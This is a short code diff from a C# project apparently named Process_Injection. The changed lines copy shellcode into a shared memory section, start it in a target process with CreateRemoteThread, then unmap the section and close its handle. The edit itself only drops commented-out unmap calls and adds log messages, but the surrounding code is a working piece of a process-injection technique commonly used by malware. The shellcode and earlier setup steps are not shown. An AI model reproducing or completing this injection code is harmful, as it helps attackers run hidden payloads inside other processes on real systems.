@@ -84,16 +84,15 @@ namespace Process_Injection
             Marshal.Copy(shellcode, 0, localSectionAddress, shellcode.Length);
             Console.WriteLine("Shellcode copied to local section!");
 
-            // NtUnmapViewOfSection(targetHandle, localSectionAddress);
-            // NtUnmapViewOfSection(targetHandle, remoteSectionAddress);
-
             // CreateRemoteThread (hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
             IntPtr hThread = CreateRemoteThread(targetHandle, IntPtr.Zero, 0, remoteSectionAddress, (IntPtr)addr, 0, IntPtr.Zero);
             Console.WriteLine(hThread.ToString());
             Console.WriteLine("Remote thread created!");
 
             NtUnmapViewOfSection(sectionHandle, remoteSectionAddress);
+            Console.WriteLine("Local section unmaped!");
             NtClose(sectionHandle);
+            Console.WriteLine("Local handler closed!");
 
         }
     }
